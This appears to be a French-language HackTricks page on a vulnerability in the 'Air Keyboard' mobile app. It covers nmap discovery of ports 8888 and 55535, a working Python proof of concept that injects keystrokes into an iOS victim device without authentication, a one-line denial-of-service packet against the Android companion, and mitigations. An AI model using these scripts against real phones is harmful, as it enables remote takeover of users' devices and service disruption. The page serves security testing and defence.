# Air Keyboard Remote Input Injection (Listener TCP non authentifié)

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

La version iOS de l'application commerciale "Air Keyboard" (ID App Store 6463187929) ouvre un **service TCP en texte clair sur le port 8888** qui accepte des trames de frappes de clavier **sans aucune authentification**. 
Tout appareil sur le même réseau Wi-Fi peut se connecter à ce port et injecter des entrées de clavier arbitraires dans le téléphone de la victime, réalisant ainsi un **détournement complet de l'interaction à distance**.

Une version Android compagnon écoute sur **le port 55535**. Elle effectue une poignée de main AES-ECB faible, mais des données corrompues provoquent une **exception non gérée dans la routine de déchiffrement OpenSSL**, faisant planter le service en arrière-plan (**DoS**).

## 1. Découverte de service

Scannez le réseau local et recherchez les deux ports fixes utilisés par les applications :
```bash
# iOS (input-injection)
nmap -p 8888 --open 192.168.1.0/24

# Android (weakly-authenticated service)
nmap -p 55535 --open 192.168.1.0/24
```
Sur les appareils Android, vous pouvez identifier le package responsable localement :
```bash
adb shell netstat -tulpn | grep 55535     # no root required on emulator

# rooted device / Termux
netstat -tulpn | grep LISTEN
ls -l /proc/<PID>/cmdline                # map PID → package name
```
## 2. Format de Cadre (iOS)

Le binaire révèle la logique de parsing suivante à l'intérieur de la routine `handleInputFrame()`:
```
[length (2 bytes little-endian)]
[device_id (1 byte)]
[payload ASCII keystrokes]
```
La longueur déclarée inclut le byte `device_id` **mais pas** l'en-tête de deux bytes lui-même.

## 3. Exploitation PoC
```python
#!/usr/bin/env python3
"""Inject arbitrary keystrokes into Air Keyboard for iOS"""
import socket, sys

target_ip = sys.argv[1]                  # e.g. 192.168.1.50
keystrokes = b"open -a Calculator\n"     # payload visible to the user

frame  = bytes([(len(keystrokes)+1) & 0xff, (len(keystrokes)+1) >> 8])
frame += b"\x01"                         # device_id = 1 (hard-coded)
frame += keystrokes

with socket.create_connection((target_ip, 8888)) as s:
s.sendall(frame)
print("Injected", keystrokes)
```
Tout ASCII imprimable (y compris `\n`, `\r`, les touches spéciales, etc.) peut être envoyé, accordant effectivement à l'attaquant le même pouvoir qu'une entrée utilisateur physique : lancer des applications, envoyer des messages instantanés, visiter des URL de phishing, etc.

## 4. Android Companion – Déni de service

Le port Android (55535) attend un mot de passe de 4 caractères chiffré avec une **clé AES-128-ECB codée en dur** suivi d'un nonce aléatoire. Les erreurs de parsing remontent à `AES_decrypt()` et ne sont pas interceptées, ce qui termine le thread d'écoute. Un seul paquet malformé est donc suffisant pour maintenir les utilisateurs légitimes déconnectés jusqu'à ce que le processus soit relancé.
```python
import socket
socket.create_connection((victim, 55535)).send(b"A"*32)  # minimal DoS
```
## 5. Cause Racine

1. **Pas de vérifications d'origine / d'intégrité** sur les trames entrantes (iOS).
2. **Mauvaise utilisation cryptographique** (clé statique, ECB, validation de longueur manquante) et **manque de gestion des exceptions** (Android).

## 6. Atténuations & Idées de Renforcement

* Ne jamais exposer de services non authentifiés sur un appareil mobile.
* Dériver des secrets par appareil lors de l'intégration et les vérifier avant de traiter les entrées.
* Lier l'écouteur à `127.0.0.1` et utiliser un transport chiffré et authentifié mutuellement (par exemple, TLS, Noise) pour le contrôle à distance.
* Détecter les ports ouverts inattendus lors des revues de sécurité mobile (`netstat`, `lsof`, `frida-trace` sur `socket()` etc.).
* En tant qu'utilisateur final : désinstaller Air Keyboard ou l'utiliser uniquement sur des réseaux Wi-Fi de confiance et isolés.

## Détection Cheat-Sheet (Pentesters)
```bash
# Quick one-liner to locate vulnerable devices in a /24
nmap -n -p 8888,55535 --open 192.168.1.0/24 -oG - | awk '/Ports/{print $2,$3,$4}'

# Inspect running sockets on a connected Android target
adb shell "for p in $(lsof -PiTCP -sTCP:LISTEN -n -t); do echo -n \"$p → "; cat /proc/$p/cmdline; done"
```
## Références

- [Remote Input Injection Vulnerability in Air Keyboard iOS App Still Unpatched](https://www.mobile-hacker.com/2025/07/17/remote-input-injection-vulnerability-in-air-keyboard-ios-app-still-unpatched/)
- [CXSecurity advisory WLB-2025060015](https://cxsecurity.com/issue/WLB-2025060015)

{{#include ../../banners/hacktricks-training.md}}
